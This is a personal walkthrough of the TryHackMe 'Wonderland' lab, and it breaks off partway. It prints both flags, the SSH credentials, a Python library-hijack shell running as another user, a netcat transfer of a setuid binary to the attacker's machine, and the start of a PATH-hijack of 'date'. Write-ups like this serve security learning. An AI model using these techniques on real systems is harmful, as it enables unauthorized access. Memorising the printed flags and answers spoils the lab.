# Wonderland CTF [Tryhackme Lab Walkthrough](https://tryhackme.com/r/room/wonderland)
![wonderland](https://github.com/Esther7171/Wonderland/assets/122229257/ee54cccf-d47b-4cb7-bd9c-bfb6c660d060)

### Answer the questions below


Ques 1. Obtain the flag in user.txt
```bash
thm{"Curiouser and curiouser!"}
```

Ques 2. Escalate your privileges, what is the flag in root.txt?
```bash
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```


# 1. Let's Get Started 
### Let make a Nmap Scan
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ nmap 10.10.159.138 -sV -sC                 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 21:28 IST
Nmap scan report for 10.10.159.138
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# 2. As Http is open let make a dirctory search
### Im using ```dirsearch``` bez it easy to use
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ dirsearch -u 10.10.159.138                     
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/wonder/reports/_10.10.159.138/_24-04-05_21-34-11.txt

Target: http://10.10.159.138/

[21:34:11] Starting: 
[21:34:13] 301 -    0B  - /%2e%2e//google.com  ->  /google.com
[21:34:13] 301 -    0B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[21:34:32] 301 -    0B  - /adm/index.html  ->  ./
[21:34:34] 301 -    0B  - /admin/index.html  ->  ./
[21:34:35] 301 -    0B  - /admin2/index.html  ->  ./
[21:34:36] 301 -    0B  - /admin_area/index.html  ->  ./
[21:34:41] 301 -    0B  - /adminarea/index.html  ->  ./
[21:34:41] 301 -    0B  - /admincp/index.html  ->  ./
[21:34:43] 301 -    0B  - /administrator/index.html  ->  ./
[21:34:46] 301 -    0B  - /api/index.html  ->  ./
[21:34:47] 301 -    0B  - /api/swagger/static/index.html  ->  ./
[21:34:47] 301 -    0B  - /api/swagger/index.html  ->  ./
[21:34:49] 301 -    0B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
[21:34:49] 301 -    0B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[21:34:49] 301 -    0B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[21:34:50] 301 -    0B  - /bb-admin/index.html  ->  ./
[21:34:53] 301 -    0B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[21:34:53] 301 -    0B  - /cgi-bin/index.html  ->  ./
[21:34:54] 301 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[21:34:58] 301 -    0B  - /core/latest/swagger-ui/index.html  ->  ./
[21:35:00] 301 -    0B  - /demo/ejb/index.html  ->  ./
[21:35:01] 301 -    0B  - /doc/html/index.html  ->  ./
[21:35:01] 301 -    0B  - /docs/html/admin/index.html  ->  ./
[21:35:01] 301 -    0B  - /docs/html/index.html  ->  ./
[21:35:02] 301 -    0B  - /druid/index.html  ->  ./
[21:35:03] 301 -    0B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[21:35:03] 301 -    0B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[21:35:04] 301 -    0B  - /estore/index.html  ->  ./
[21:35:04] 301 -    0B  - /examples/jsp/index.html  ->  ./
[21:35:04] 301 -    0B  - /examples/servlets/index.html  ->  ./
[21:35:05] 301 -    0B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[21:35:09] 301 -    0B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[21:35:10] 301 -    0B  - /img  ->  img/
[21:35:11] 301 -    0B  - /index.html  ->  ./
[21:35:17] 301 -    0B  - /logon/LogonPoint/index.html  ->  ./
[21:35:18] 301 -    0B  - /manual/index.html  ->  ./
[21:35:20] 301 -    0B  - /mifs/user/index.html  ->  ./
[21:35:20] 301 -    0B  - /modelsearch/index.html  ->  ./
[21:35:25] 301 -    0B  - /panel-administracion/index.html  ->  ./
[21:35:28] 301 -    0B  - /phpmyadmin/docs/html/index.html  ->  ./
[21:35:28] 301 -    0B  - /phpmyadmin/doc/html/index.html  ->  ./
[21:35:31] 301 -    0B  - /prod-api/druid/index.html  ->  ./
[21:35:32] 301 -    0B  - /r  ->  r/
[21:35:38] 301 -    0B  - /siteadmin/index.html  ->  ./
[21:35:41] 301 -    0B  - /stzx_admin/index.html  ->  ./
[21:35:42] 301 -    0B  - /swagger/index.html  ->  ./
[21:35:43] 301 -    0B  - /templates/index.html  ->  ./
[21:35:44] 301 -    0B  - /tiny_mce/plugins/imagemanager/pages/im/index.html  ->  ./
[21:35:49] 301 -    0B  - /vpn/index.html  ->  ./
[21:35:51] 301 -    0B  - /webadmin/index.html  ->  ./
[21:35:52] 301 -    0B  - /webdav/index.html  ->  ./

Task Completed
```
### Got a lot of page but let visite ip first
![Screenshot from 2024-04-05 21-38-29](https://github.com/Esther7171/Wonderland/assets/122229257/6f966ffa-66e2-4efc-a8b0-39a1d30fb78e)
#### I manually check admin and index but nothing i got let check  /r  it look intreasting
#### Ohh i got something
![Screenshot from 2024-04-05 22-36-52](https://github.com/Esther7171/Wonderland/assets/122229257/e22cb34f-05bb-4c4a-8a3f-353d5fefaa2b)
## So let make again dirSearch
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ dirsearch -u 10.10.159.138/r
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/wonder/reports/_10.10.159.138/_r_24-04-05_22-38-23.txt

Target: http://10.10.159.138/

[22:38:23] Starting: r/
[22:38:27] 301 -    0B  - /r/%2e%2e//google.com  ->  /google.com
[22:38:27] 301 -    0B  - /r/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[22:38:41] 301 -    0B  - /r/a  ->  a/
[22:38:44] 301 -    0B  - /r/adm/index.html  ->  ./
[22:38:46] 301 -    0B  - /r/admin/index.html  ->  ./
[22:38:48] 301 -    0B  - /r/admin2/index.html  ->  ./
[22:38:48] 301 -    0B  - /r/admin_area/index.html  ->  ./
[22:38:53] 301 -    0B  - /r/adminarea/index.html  ->  ./
[22:38:54] 301 -    0B  - /r/admincp/index.html  ->  ./
[22:38:55] 301 -    0B  - /r/administrator/index.html  ->  ./
[22:38:58] 301 -    0B  - /r/api/index.html  ->  ./
[22:38:59] 301 -    0B  - /r/api/swagger/index.html  ->  ./
[22:38:59] 301 -    0B  - /r/api/swagger/static/index.html  ->  ./
[22:39:01] 301 -    0B  - /r/axis//happyaxis.jsp  ->  /r/axis/happyaxis.jsp
[22:39:01] 301 -    0B  - /r/axis2-web//HappyAxis.jsp  ->  /r/axis2-web/HappyAxis.jsp
[22:39:01] 301 -    0B  - /r/axis2//axis2-web/HappyAxis.jsp  ->  /r/axis2/axis2-web/HappyAxis.jsp
[22:39:02] 301 -    0B  - /r/bb-admin/index.html  ->  ./
[22:39:05] 301 -    0B  - /r/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[22:39:05] 301 -    0B  - /r/cgi-bin/index.html  ->  ./
[22:39:06] 301 -    0B  - /r/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /r/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[22:39:09] 301 -    0B  - /r/core/latest/swagger-ui/index.html  ->  ./
[22:39:12] 301 -    0B  - /r/demo/ejb/index.html  ->  ./
[22:39:13] 301 -    0B  - /r/doc/html/index.html  ->  ./
[22:39:13] 301 -    0B  - /r/docs/html/admin/index.html  ->  ./
[22:39:13] 301 -    0B  - /r/docs/html/index.html  ->  ./
[22:39:14] 301 -    0B  - /r/druid/index.html  ->  ./
[22:39:15] 301 -    0B  - /r/engine/classes/swfupload//swfupload.swf  ->  /r/engine/classes/swfupload/swfupload.swf
[22:39:15] 301 -    0B  - /r/engine/classes/swfupload//swfupload_f9.swf  ->  /r/engine/classes/swfupload/swfupload_f9.swf
[22:39:16] 301 -    0B  - /r/estore/index.html  ->  ./
[22:39:16] 301 -    0B  - /r/examples/servlets/index.html  ->  ./
[22:39:16] 301 -    0B  - /r/examples/jsp/index.html  ->  ./
[22:39:16] 301 -    0B  - /r/extjs/resources//charts.swf  ->  /r/extjs/resources/charts.swf
[22:39:21] 301 -    0B  - /r/html/js/misc/swfupload//swfupload.swf  ->  /r/html/js/misc/swfupload/swfupload.swf
[22:39:23] 301 -    0B  - /r/index.html  ->  ./
[22:39:28] 301 -    0B  - /r/logon/LogonPoint/index.html  ->  ./
[22:39:30] 301 -    0B  - /r/manual/index.html  ->  ./
[22:39:32] 301 -    0B  - /r/mifs/user/index.html  ->  ./
[22:39:32] 301 -    0B  - /r/modelsearch/index.html  ->  ./
[22:39:37] 301 -    0B  - /r/panel-administracion/index.html  ->  ./
[22:39:40] 301 -    0B  - /r/phpmyadmin/doc/html/index.html  ->  ./
[22:39:40] 301 -    0B  - /r/phpmyadmin/docs/html/index.html  ->  ./
[22:39:43] 301 -    0B  - /r/prod-api/druid/index.html  ->  ./
[22:39:50] 301 -    0B  - /r/siteadmin/index.html  ->  ./
[22:39:53] 301 -    0B  - /r/stzx_admin/index.html  ->  ./
[22:39:54] 301 -    0B  - /r/swagger/index.html  ->  ./
[22:39:56] 301 -    0B  - /r/templates/index.html  ->  ./
[22:39:57] 301 -    0B  - /r/tiny_mce/plugins/imagemanager/pages/im/index.html  ->  ./
[22:40:02] 301 -    0B  - /r/vpn/index.html  ->  ./
[22:40:04] 301 -    0B  - /r/webadmin/index.html  ->  ./
[22:40:04] 301 -    0B  - /r/webdav/index.html  ->  ./

Task Completed
```
## Got /a
![Screenshot from 2024-04-05 22-45-26](https://github.com/Esther7171/Wonderland/assets/122229257/b9931dbb-462e-4eec-86a9-ceed2171a3cc)


### Again so many but specific one is /a
### Let make again dirSearch at /a
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ dirsearch -u 10.10.159.138/r/a
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ dirsearch -u 10.10.159.138/r/a
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/Lab-CTF/wonder/reports/_10.10.159.138/_r_a_24-04-05_22-42-56.txt

Target: http://10.10.159.138/

[22:42:56] Starting: r/a/
[22:42:59] 301 -    0B  - /r/a/%2e%2e//google.com  ->  /r/google.com
[22:42:59] 301 -    0B  - /r/a/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[22:43:17] 301 -    0B  - /r/a/adm/index.html  ->  ./
[22:43:19] 301 -    0B  - /r/a/admin/index.html  ->  ./
[22:43:20] 301 -    0B  - /r/a/admin2/index.html  ->  ./
[22:43:21] 301 -    0B  - /r/a/admin_area/index.html  ->  ./
[22:43:26] 301 -    0B  - /r/a/adminarea/index.html  ->  ./
[22:43:26] 301 -    0B  - /r/a/admincp/index.html  ->  ./
[22:43:28] 301 -    0B  - /r/a/administrator/index.html  ->  ./
[22:43:31] 301 -    0B  - /r/a/api/index.html  ->  ./
[22:43:31] 301 -    0B  - /r/a/api/swagger/static/index.html  ->  ./
[22:43:31] 301 -    0B  - /r/a/api/swagger/index.html  ->  ./
[22:43:34] 301 -    0B  - /r/a/axis2-web//HappyAxis.jsp  ->  /r/a/axis2-web/HappyAxis.jsp
[22:43:34] 301 -    0B  - /r/a/axis//happyaxis.jsp  ->  /r/a/axis/happyaxis.jsp
[22:43:34] 301 -    0B  - /r/a/axis2//axis2-web/HappyAxis.jsp  ->  /r/a/axis2/axis2-web/HappyAxis.jsp
[22:43:34] 301 -    0B  - /r/a/b  ->  b/
[22:43:35] 301 -    0B  - /r/a/bb-admin/index.html  ->  ./
[22:43:38] 301 -    0B  - /r/a/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd  ->  /etc/passwd
[22:43:38] 301 -    0B  - /r/a/cgi-bin/index.html  ->  ./
[22:43:39] 301 -    0B  - /r/a/Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /r/a/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[22:43:43] 301 -    0B  - /r/a/core/latest/swagger-ui/index.html  ->  ./
[22:43:45] 301 -    0B  - /r/a/demo/ejb/index.html  ->  ./
[22:43:46] 301 -    0B  - /r/a/doc/html/index.html  ->  ./
[22:43:46] 301 -    0B  - /r/a/docs/html/index.html  ->  ./
[22:43:46] 301 -    0B  - /r/a/docs/html/admin/index.html  ->  ./
[22:43:47] 301 -    0B  - /r/a/druid/index.html  ->  ./
[22:43:48] 301 -    0B  - /r/a/engine/classes/swfupload//swfupload.swf  ->  /r/a/engine/classes/swfupload/swfupload.swf
[22:43:48] 301 -    0B  - /r/a/engine/classes/swfupload//swfupload_f9.swf  ->  /r/a/engine/classes/swfupload/swfupload_f9.swf
[22:43:48] 301 -    0B  - /r/a/estore/index.html  ->  ./
[22:43:49] 301 -    0B  - /r/a/examples/jsp/index.html  ->  ./
[22:43:49] 301 -    0B  - /r/a/examples/servlets/index.html  ->  ./
[22:43:49] 301 -    0B  - /r/a/extjs/resources//charts.swf  ->  /r/a/extjs/resources/charts.swf
[22:43:54] 301 -    0B  - /r/a/html/js/misc/swfupload//swfupload.swf  ->  /r/a/html/js/misc/swfupload/swfupload.swf
[22:43:56] 301 -    0B  - /r/a/index.html  ->  ./
[22:44:02] 301 -    0B  - /r/a/logon/LogonPoint/index.html  ->  ./
[22:44:03] 301 -    0B  - /r/a/manual/index.html  ->  ./
[22:44:05] 301 -    0B  - /r/a/mifs/user/index.html  ->  ./
[22:44:05] 301 -    0B  - /r/a/modelsearch/index.html  ->  ./
[22:44:09] 301 -    0B  - /r/a/panel-administracion/index.html  ->  ./
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: q
[s]ave / [q]uit without saving: q

Canceled by the user
```
### Ok so i got /b so i dont need to dig more 
![hhhhh3](https://github.com/Esther7171/Wonderland/assets/122229257/c6decf71-4df4-4249-b1f2-cffb84aad06f)
### So Things making sence ```rabbit``` let try Directly  http://10.10.159.138/r/a/b/b/i/t/
![Screenshot from 2024-04-05 22-50-26](https://github.com/Esther7171/Wonderland/assets/122229257/f69b31d8-f468-470d-8e94-b559cc1ac080)
### Let check code
![Screenshot from 2024-04-05 22-54-12](https://github.com/Esther7171/Wonderland/assets/122229257/8dad040d-8815-43ab-a15d-ca723ee4b38c)

# 3. SSH Time
### We got username alice and password
```bash
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```
## Let enter !!
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ ssh alice@10.10.159.138
The authenticity of host '10.10.159.138 (10.10.159.138)' can't be established.
ED25519 key fingerprint is SHA256:Q8PPqQyrfXMAZkq45693yD4CmWAYp5GOINbxYqTRedo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.159.138' (ED25519) to the list of known hosts.
alice@10.10.159.138's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Apr  5 17:27:31 UTC 2024

  System load:  0.0                Processes:           84
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 29%                IP address for eth0: 10.10.159.138
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```
## Ok let manually enumerate
```bash

alice@wonderland:~$ ls -la
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
alice@wonderland:~$ cd /home
alice@wonderland:/home$ ls
alice  hatter  rabbit  tryhackme
alice@wonderland:/home$
```
### So we got some user and a python file
### Let see content of python file


## As i remember There is a hint for user.txt in the Wonderland room ```Everything is upside down here``` as root.txt in alice so maybe user.txt is in root
```bash
alice@wonderland:/home$ cd /
alice@wonderland:/$ ls
bin  boot  cdrom  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  swap.img  sys  tmp  usr  var  vmlinuz  vmlinuz.old
alice@wonderland:/$ cd root/
alice@wonderland:/root$ ls
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ ls -la
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$ cd /root
alice@wonderland:/root$ ls 
ls: cannot open directory '.': Permission denied
alice@wonderland:/root$
```
### So try directly , Ohh we got flag !! 
```bash
alice@wonderland:/home$ cat /root/user.txt
thm{"Curiouser and curiouser!"}
alice@wonderland:/home$ 
```
# 4. Try to find more clues to Privilege Escalation
```bash
alice@wonderland:/root$ sudo -l
[sudo] password for alice: 
Sorry, try again.
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:/root$ 
```
## So Let see content of python file
```bash
alice@wonderland:/home$ cd alice
alice@wonderland:~$ cat walrus_and_the_carpenter.py 
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night.

The moon was shining sulkily,
Because she thought the sun
Had got no business to be there
After the day was done —
"It’s very rude of him," she said,
"To come and spoil the fun!"

The sea was wet as wet could be,
The sands were dry as dry.
You could not see a cloud, because
No cloud was in the sky:
No birds were flying over head —
There were no birds to fly.

The Walrus and the Carpenter
Were walking close at hand;
They wept like anything to see
Such quantities of sand:
"If this were only cleared away,"
They said, "it would be grand!"

"If seven maids with seven mops
Swept it for half a year,
Do you suppose," the Walrus said,
"That they could get it clear?"
"I doubt it," said the Carpenter,
And shed a bitter tear.

"O Oysters, come and walk with us!"
The Walrus did beseech.
"A pleasant walk, a pleasant talk,
Along the briny beach:
We cannot do with more than four,
To give a hand to each."

The eldest Oyster looked at him.
But never a word he said:
The eldest Oyster winked his eye,
And shook his heavy head —
Meaning to say he did not choose
To leave the oyster-bed.

But four young oysters hurried up,
All eager for the treat:
there coats were brushed, there faces washed,
there shoes were clean and neat —
And this was odd, because, you know,
They hadn’t any feet.

Four other Oysters followed them,
And yet another four;
And thick and fast they came at last,
And more, and more, and more —
All hopping through the frothy waves,
And scrambling to the shore.

The Walrus and the Carpenter
Walked on a mile or so,
And then they rested on a rock
Conveniently low:
And all the little Oysters stood
And waited in a row.

"The time has come," the Walrus said,
"To talk of many things:
Of shoes — and ships — and sealing-wax —
Of cabbages — and kings —
And why the sea is boiling hot —
And whether pigs have wings."

"But wait a bit," the Oysters cried,
"Before we have our chat;
For some of us are out of breath,
And all of us are fat!"
"No hurry!" said the Carpenter.
They thanked him much for that.

"A loaf of bread," the Walrus said,
"Is what we chiefly need:
Pepper and vinegar besides
Are very good indeed —
Now if you’re ready Oysters dear,
We can begin to feed."

"But not on us!" the Oysters cried,
Turning a little blue,
"After such kindness, that would be
A dismal thing to do!"
"The night is fine," the Walrus said
"Do you admire the view?

"It was so kind of you to come!
And you are very nice!"
The Carpenter said nothing but
"Cut us another slice:
I wish you were not quite so deaf —
I’ve had to ask you twice!"

"It seems a shame," the Walrus said,
"To play them such a trick,
After we’ve brought them out so far,
And made them trot so quick!"
The Carpenter said nothing but
"The butter’s spread too thick!"

"I weep for you," the Walrus said.
"I deeply sympathize."
With sobs and tears he sorted out
Those of the largest size.
Holding his pocket handkerchief
Before his streaming eyes.

"O Oysters," said the Carpenter.
"You’ve had a pleasant run!
Shall we be trotting home again?"
But answer came there none —
And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)alice@wonderland:~$ 
```
  ### Intreasting Import random on first line look like we got our way
  #### Let check path to double confirm
```bash
python3 -c 'import sys; print (sys.path)'
```
```bash
alice@wonderland:~$ python3 -c 'import sys; print (sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
alice@wonderland:~$
```
#### Ok We have python library , but let check if there is any cron job
```bash
  alice@wonderland:~$ crontab -l
no crontab for alice
alice@wonderland:~$ ps
  PID TTY          TIME CMD
 1256 pts/0    00:00:00 bash
 1388 pts/0    00:00:00 ps
alice@wonderland:~$ 
```
### Na
## So Let check sudor.d file
```bash
alice@wonderland:~$ cat /etc/sudoers.d/alice 
alice ALL = (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ 
```
## So Rabbit have permission to run python file
## Ok so let make a fake python random module with same name to fill it with malicious code and run 
# 5. Access rabbit using Python script
### I'm Writing a testing program just for try
```bash
alice@wonderland:~$ echo ""import os"
> os.system("/bin/bash")" > random.py
alice@wonderland:~$ cat random.py 
import os
os.system("/bin/bash")
alice@wonderland:~$ 
```
## Let try to run probably it will run as i think of !!
```bash
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
rabbit@wonderland:~$ 
```
## wow I got this 
### So let manually enum this
```bash
rabbit@wonderland:~$ pwd
/home/alice
rabbit@wonderland:~$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ls -la
total 40
drwxr-x--- 2 rabbit rabbit  4096 May 25  2020 .
drwxr-xr-x 6 root   root    4096 May 25  2020 ..
lrwxrwxrwx 1 root   root       9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rabbit rabbit   220 May 25  2020 .bash_logout
-rw-r--r-- 1 rabbit rabbit  3771 May 25  2020 .bashrc
-rw-r--r-- 1 rabbit rabbit   807 May 25  2020 .profile
-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
rabbit@wonderland:/home/rabbit$ 
```
### I found something suspicious ```teaParty``` is in red colour
## Ok try to execute and read content but it not doing anything.
```bash
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Fri, 05 Apr 2024 19:27:36 +0000
Ask very nicely, and I will give you some tea while you wait for him
dddd
Segmentation fault (core dumped)
rabbit@wonderland:/home/rabbit$ nano teaParty 
Unable to create directory /home/alice/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

rabbit@wonderland:/home/rabbit$ 
```
### Let ltrace it
```bash
rabbit@wonderland:/home/rabbit$ ltrace ./teaParty 
setuid(1003)                                                                                                                                       = -1
setgid(1003)                                                                                                                                       = -1
puts("Welcome to the tea party!\nThe Ma"...Welcome to the tea party!
The Mad Hatter will be here soon.
)                                                                                                       = 60
system("/bin/echo -n 'Probably by ' && d"...Probably by Fri, 05 Apr 2024 19:32:17 +0000
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                                             = 0
puts("Ask very nicely, and I will give"...Ask very nicely, and I will give you some tea while you wait for him
)                                                                                                        = 69
getchar(1, 0x559459346260, 0x7ff7565ae8c0, 0x7ff7562d11542
)                                                                                         = 50
puts("Segmentation fault (core dumped)"...Segmentation fault (core dumped)
)                                                                                                        = 33
+++ exited (status 33) +++
rabbit@wonderland:/home/rabbit$
``` 
## OK it's made up fault of segmentation 
### Let check strings 
```bash
rabbit@wonderland:/home/rabbit$ strings teaParty 

Command 'strings' not found, but can be installed with:

apt install binutils
Please ask your administrator.

rabbit@wonderland:/home/rabbit$
```

### ohh i can't do it in rabit, let transfer it to my system using netcat
#### Open listener and direct content to a txt file
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ nc -lvnp 4444 > teaparty
listening on [any] 4444 ...
```
### In rabbit Transfer teaParty file
```bash
rabbit@wonderland:/home/rabbit$ nc 10.17.120.99 4444 < teaParty
c^C
```
### Suspend connection 
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ nc -lvnp 4444 > teaparty
listening on [any] 4444 ...
connect to [10.17.120.99] from (UNKNOWN) [10.10.159.138] 59842
```
### Let check strings
```bash
┌──(death㉿esther)-[~/Lab-CTF/wonder]
└─$ strings teaparty
/lib64/ld-linux-x86-64.so.2
2U~4
libc.so.6
setuid
puts
getchar
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
Welcome to the tea party!
The Mad Hatter will be here soon.
/bin/echo -n 'Probably by ' && date --date='next hour' -R
Ask very nicely, and I will give you some tea while you wait for him
Segmentation fault (core dumped)
;*3$"
GCC: (Debian 8.3.0-6) 8.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.7325
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
teaParty.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
getchar@@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```
# 6. Let Try to modify date
## As i think date have directly so try to modify it
### Let check path 
```bash
echo "$PATH"
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
```
## Ok let try to make a file with date
```bash
rabbit@wonderland:/home/rabbit$ nano date 
Unable to create directory /home/alice/.local/share/nano/: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue
```
## Add few lines to get new bash session
![Screenshot from 2024-04-06 00-51-54](https://github.com/Esther7171/Wonderland/assets/122229257/52bce8df-8de2-4e83-a6ee-f224f7d1ff87)

## Let give permission and run this
```bash
rabbit@wonderland:/home/rabbit$ chmod +x date 
rabbit@wonderland:/home/rabbit$ ./date
rabbit@wonderland:/home/rabbit$ 
```
## Let check the shell level to get an idea of success
```bash
rabbit@wonderland:/home/rabbit$ echo "$SHLVL"
3
rabbit@wonderland:/home/rabbit$ 
```
### okay we got differ session 
# 7. Let add this to path
```bash
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
